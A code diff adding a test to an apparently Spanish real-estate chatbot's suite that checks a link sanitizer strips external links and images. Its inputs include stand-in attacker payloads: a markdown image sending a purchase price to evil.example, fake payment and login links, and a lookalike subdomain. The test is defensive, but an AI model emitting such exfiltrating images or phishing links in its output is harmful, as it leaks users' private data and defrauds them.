@@ -180,3 +180,22 @@ def test_enlaces_inventados_se_quitan(make_property):
     out = chat.sanitize_links(text, None, "guest")
     assert out == (f"[Piso real](/property/{real.id}) Inventado Borrador mapa [Ver en Mapa](/?view=map&location=Murcia) "
                    f"[Contacto](/property/{real.id}#contacto) [AMI](https://amifincas.es) [Ficha](/inmueble/{real.id}-piso-en-cartagena) Otra")
+
+
+def test_sanitize_quita_imagenes_y_enlaces_externos(make_property):
+    p = make_property(title="Piso público", status="for-sale")
+    text = "\n".join([
+        f"Mira [el piso](/inmueble/{p.id}-piso-publico) y [contacto](/contact).",
+        "![x](https://evil.example/leak?d=precio_compra:99999)",
+        "[Paga la reserva aquí](https://evil.example/pagar) o [esto](//evil.example/login)",
+        "<https://evil.example/auto> [mapa](https://www.google.com/maps/search/?api=1&query=Murcia)",
+        "[web](https://ubica.amifincas.es/about) [falsa](https://ubica.amifincas.es.evil.example/x)",
+        "[ref][1]",
+        "[1]: https://evil.example/ref",
+    ])
+    out = chat.sanitize_links(text, None, "guest")
+    assert "evil.example" not in out
+    assert f"[el piso](/inmueble/{p.id}-piso-publico)" in out and "[contacto](/contact)" in out
+    assert "[mapa](https://www.google.com/maps/search/?api=1&query=Murcia)" in out
+    assert "[web](https://ubica.amifincas.es/about)" in out
+    assert "Paga la reserva aquí" in out and "![" not in out
